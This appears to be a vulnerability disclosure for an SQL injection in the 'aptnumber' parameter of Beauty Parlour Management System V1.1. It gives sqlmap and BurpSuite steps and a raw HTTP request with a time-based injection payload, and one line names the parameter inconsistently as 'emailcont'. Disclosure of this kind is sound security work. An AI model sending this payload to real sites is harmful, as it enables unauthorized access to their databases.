# Beauty Parlour Management System V1.1 SQL Injection Vulnerability
##### Vulnerability Location: /appointment-detail.php
##### Affected Range: Beauty Parlour Management System V1.1
##### Vulnerability Cause: appointment-detail.php contains a serious security vulnerability. The manipulation of the argument aptnumber leads to sql injection. The attack can be launched remotely.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions;
##### Link: https://phpgurukul.com/beauty-parlour-management-system-using-php-and-mysql/
# Vulnerability recurrence

This vulnerability only requires the permission of ordinary users. Ordinary users can register through the "signup" function.

<img width="1512" height="873" alt="image" src="https://github.com/user-attachments/assets/8804f5b5-6ec3-4878-afc5-446744cb51c9" />

Use BurpSuite to capture the data packets. There is an SQL injection vulnerability in the "aptnumber" parameter.

<img width="1473" height="669" alt="image" src="https://github.com/user-attachments/assets/2de90e74-1bea-4fff-a42d-25da1552dc56" />

Use sqlmap for automated injection to obtain the current database name.

<img width="1502" height="797" alt="image" src="https://github.com/user-attachments/assets/549e621a-4634-46ac-a726-ba4f65d2153b" />

```
GET /appointment-detail.php?aptnumber=1'+or+sleep(2)--+ HTTP/1.1
Host: 192.168.2.133:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: close
Referer: http://192.168.2.133:8080/profile.php
Cookie: PHPSESSID=08egf6l166ui4okapsps1f5236
Upgrade-Insecure-Requests: 1
Priority: u=0, i


```

# Code Analysis

The argument: emailcont in /appointment-detail.php:

<img width="1503" height="334" alt="image" src="https://github.com/user-attachments/assets/0f9a63b0-a3ca-49c9-9fc6-b50e93e05fa4" />

<img width="1522" height="239" alt="image" src="https://github.com/user-attachments/assets/0e4727ce-063e-4bf9-898f-f504fb8bce77" />

Directly inserting the user-provided aptnumber into the SQL statement leads to the occurrence of SQL injection vulnerability.
